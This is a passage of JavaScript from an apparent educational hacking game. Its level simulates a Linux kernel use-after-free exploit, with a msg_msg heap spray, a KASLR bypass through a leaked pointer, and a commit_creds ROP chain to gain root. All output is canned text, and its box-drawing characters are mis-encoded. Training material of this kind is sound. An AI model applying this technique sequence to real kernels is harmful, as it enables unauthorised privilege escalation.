    print('â•‘    call   [rax + 0x50]           ; Calls func_ptr at offset 80!         â•‘', 'error');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
    print('');
    print('[+] Function pointer is at offset 0x50 (80 bytes)', 'success');
    print('[+] We can control this via heap spray!', 'success');

    state.reversedIoctl = true;
    autosave();
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // STRUCT - View object structure
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'struct') {
    print('');
    print('struct vuln_obj {', 'system');
    print('    char data[80];           // 0x00 - 0x4F (80 bytes)', 'system');
    print('    void (*func_ptr)(void*); // 0x50 (offset 80) - FUNCTION POINTER', 'error');
    print('    unsigned long flags;     // 0x58 (offset 88)', 'system');
    print('};  // Total size: 96 bytes (kmalloc-96 slab)', 'info');
    print('');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // IOCTL - Interact with driver
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'ioctl') {
    const action = args[0];

    if (action === 'alloc') {
      print('[*] Opening /dev/vuln_driver...', 'system');
      print('[*] ioctl(fd, 0x1337, NULL) - ALLOC_OBJ', 'system');
      await sleep(500);
      print('[+] Object allocated successfully', 'success');
      print('[+] Kernel allocated 96 bytes in kmalloc-96 slab', 'info');

      state.allocatedObject = true;
      autosave();
      return;
    }

    if (action === 'free') {
      if (!state.allocatedObject) {
        print('[!] No object allocated yet', 'error');
        return;
      }

      print('[*] ioctl(fd, 0x1338, NULL) - FREE_OBJ', 'system');
      await sleep(500);
      print('[+] Object freed', 'success');
      print('[!] WARNING: global_obj pointer is now DANGLING!', 'warning');
      print('[!] The freed memory can be reclaimed with controlled data', 'error');

      state.freedObject = true;
      autosave();
      return;
    }

    if (action === 'use') {
      if (!state.freedObject) {
        print('[!] Object not in vulnerable state (need to free first)', 'error');
        return;
      }

      if (!state.heapSprayed || !state.overwrotePtr) {
        print('[*] ioctl(fd, 0x1339, NULL) - USE_OBJ', 'system');
        await sleep(500);
        print('[!] KERNEL PANIC - Attempted to call invalid function pointer', 'error');
        print('[!] The freed memory contained garbage - spray first!', 'warning');
        return;
      }

      print('[*] ioctl(fd, 0x1339, &fake_obj) - USE_OBJ', 'system');
      await sleep(1000);
      print('[+] Function pointer called successfully!', 'success');
      print('[+] ROP chain executed: commit_creds(prepare_kernel_cred(0))', 'success');

      state.triggeredExploit = true;
      autosave();
      return;
    }

    if (action === 'read') {
      if (!state.freedObject) {
        print('[*] ioctl(fd, 0x133A, buf) - READ_OBJ', 'system');
        print('[*] Object data (non-sensitive):', 'system');
        print('    00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00', 'system');
        return;
      }

      if (!state.heapSprayed) {
        print('[*] ioctl(fd, 0x133A, buf) - READ_OBJ', 'system');
        print('[!] Reading freed memory - contains residual data', 'warning');
        print('    Leaked pointer at offset 0: 0xffff888012345678', 'success');
        state.leakedPointer = true;
        autosave();
        return;
      }

      print('[*] Reading sprayed object data...', 'system');
      return;
    }

    print('Usage: ioctl <alloc|free|use|read>', 'error');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // SPRAY - Heap spray with msg_msg
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'spray') {
    if (!state.freedObject) {
      print('[!] Free the object first to create the vulnerability', 'warning');
      return;
    }

    await simulateLoading('Heap spraying with msg_msg', 2000);
    print('');
    print('[*] Creating 100 message queues...', 'system');
    print('[*] Sending messages with controlled data...', 'system');
    print('[*] Message size: 48 bytes (header) + 48 bytes (mtext) = 96 bytes', 'info');
    print('[*] Target slab: kmalloc-96 (same as vuln_obj!)', 'success');
    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'success');
    print('â•‘                    HEAP SPRAY SUCCESSFUL                          â•‘', 'success');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'success');
    print('â•‘  msg_msg structures sprayed into kmalloc-96 slab                  â•‘', 'info');
    print('â•‘  High probability of reclaiming freed vuln_obj memory             â•‘', 'info');
    print('â•‘                                                                   â•‘', 'info');
    print('â•‘  Our controlled data overwrites:                                  â•‘', 'warning');
    print('â•‘    offset 0x50 (func_ptr): 0xffffffff81234567 (our ROP gadget)   â•‘', 'error');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
    print('');

    state.heapSprayed = true;
    state.overwrotePtr = true;
    playAlert();
    autosave();
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // LEAK - Leak kernel pointer for KASLR bypass
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'leak') {
    if (!state.freedObject) {
      print('[!] Create UAF condition first (alloc then free)', 'warning');
      return;
    }

    await simulateLoading('Leaking kernel pointers', 1500);
    print('');
    print('[*] Triggering READ_OBJ on freed memory...', 'system');
    print('[*] Leaked data:', 'success');
    print('    0x0000: ff ff 88 80 12 34 56 78  <- Kernel heap pointer', 'success');
    print('    0x0008: ff ff ff ff 81 23 45 67  <- Kernel text pointer', 'success');
    print('');
    print('[*] Kernel text pointer: 0xffffffff81234567', 'info');
    print('[*] Known symbol offset: 0x234567', 'info');
    print('[*] KASLR base = 0xffffffff81234567 - 0x234567 = 0xffffffff81000000', 'success');
    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'success');
    print('â•‘                    KASLR BYPASS SUCCESSFUL                        â•‘', 'success');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'success');
    print('â•‘  Kernel base address: 0xffffffff81000000                          â•‘', 'success');
    print('â•‘  commit_creds:        0xffffffff810a9c70                          â•‘', 'info');
    print('â•‘  prepare_kernel_cred: 0xffffffff810a9f50                          â•‘', 'info');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
    print('');

    state.leakedPointer = true;
    state.calculatedKaslr = true;
    state.kernelBase = '0xffffffff81000000';
    playSuccess();
    autosave();
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // EXPLOIT - Run full exploit chain
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'exploit') {
    if (!state.allocatedObject) {
      print('[!] Step 1 missing: ioctl alloc', 'error');
      return;
    }
    if (!state.freedObject) {
      print('[!] Step 2 missing: ioctl free', 'error');
      return;
    }
    if (!state.heapSprayed) {
      print('[!] Step 3 missing: spray', 'error');
      return;
    }
    if (!state.calculatedKaslr) {
      print('[!] Step 4 missing: leak', 'error');
      return;
    }

    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'error');
    print('â•‘                         EXECUTING KERNEL EXPLOIT                                 â•‘', 'error');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'error');
    print('');

    print('[*] Stage 1: Preparing ROP chain...', 'system');
    await sleep(500);
    print('[+] ROP gadgets resolved using leaked KASLR base', 'success');

    print('[*] Stage 2: Building fake object with malicious func_ptr...', 'system');
    await sleep(500);
    print('[+] Fake object created with ROP pivot at offset 0x50', 'success');

    print('[*] Stage 3: Triggering USE_OBJ to call our controlled pointer...', 'warning');
    await sleep(1000);
    print('[+] Function pointer called!', 'success');

    print('[*] Stage 4: ROP chain executing...', 'warning');
    await sleep(500);
    print('    â†’ pop rdi; ret', 'system');
    print('    â†’ 0x0 (NULL for init cred)', 'system');
    print('    â†’ prepare_kernel_cred()', 'system');
    print('    â†’ pop rdi; ret', 'system');
    print('    â†’ rax (kernel_cred)', 'system');
    print('    â†’ commit_creds()', 'system');
    print('    â†’ swapgs; iretq', 'system');
    await sleep(500);

    print('');
    print('[+] ROP chain completed! Returning to userspace...', 'success');
    print('');

    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'success');
    print('â•‘                                                                                  â•‘', 'success');
    print('â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—    â•‘', 'success');
    print('â•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘    â•‘', 'success');
    print('â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘    â•‘', 'success');
    print('â•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘       â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘    â•‘', 'success');
    print('â•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•   â–ˆâ–ˆâ•‘       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•‘', 'success');
    print('â•‘   â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•    â•šâ•â•       â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•‘', 'success');
    print('â•‘                                                                                  â•‘', 'success');
    print('â•‘                   KERNEL EXPLOITATION SUCCESSFUL                                â•‘', 'success');
    print('â•‘                   uid=0(root) gid=0(root)                                       â•‘', 'success');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'success');
    print('');

    state.triggeredExploit = true;
    state.gotRoot = true;
    state.currentUser = 'root';
    setPrompt('root', 'target', '~');

    addEasterEgg('lvl5_ring0', 'Welcome to Ring 0. The kernel bows to you.');
    playSuccess();
    autosave();
    completeLevel();
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // SHELL COMMANDS
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'whoami') {
    print(state.currentUser, state.currentUser === 'root' ? 'success' : 'system');
    return;
  }

  if (cmd === 'id') {
    if (state.gotRoot) {
      print('uid=0(root) gid=0(root) groups=0(root)', 'success');
    } else {
      print('uid=1000(user) gid=1000(user) groups=1000(user)', 'system');
    }
    return;
  }

  if (cmd === 'uname') {
    print('Linux target 5.15.0-generic #1 SMP x86_64 GNU/Linux', 'system');
    return;
  }

  if (cmd === 'cat') {
    if (args[0] === '/proc/kallsyms') {
      if (!state.gotRoot) {
        print('0000000000000000 T _text', 'system');
        print('0000000000000000 T startup_64', 'system');
        print('[*] Addresses hidden without root', 'warning');
      } else {
        print('ffffffff81000000 T _text', 'success');
        print('ffffffff810a9c70 T commit_creds', 'success');
        print('ffffffff810a9f50 T prepare_kernel_cred', 'success');
      }
      return;
    }

    if (args[0] === '/etc/passwd') {
      print('root:x:0:0:root:/root:/bin/bash', 'system');
      print('user:x:1000:1000::/home/user:/bin/bash', 'system');
      return;
    }

    print(`cat: ${args[0]}: No such file`, 'error');
    return;
  }

  print(`${cmd}: command not found`, 'error');
}

function calculateLevel5Progress(state) {
  let progress = 0;

  // Recon (15%)
  if (state.analyzedModule) progress += 5;
  if (state.foundVuln) progress += 5;
  if (state.reversedIoctl) progress += 5;

  // Exploitation chain (50%)
  if (state.allocatedObject) progress += 10;
  if (state.freedObject) progress += 10;
  if (state.heapSprayed) progress += 10;
  if (state.leakedPointer) progress += 10;
  if (state.calculatedKaslr) progress += 10;

  // Privesc (35%)
  if (state.overwrotePtr) progress += 10;
  if (state.triggeredExploit) progress += 10;
  if (state.gotRoot) progress += 15;

  return Math.min(progress, 100);
}
</script>
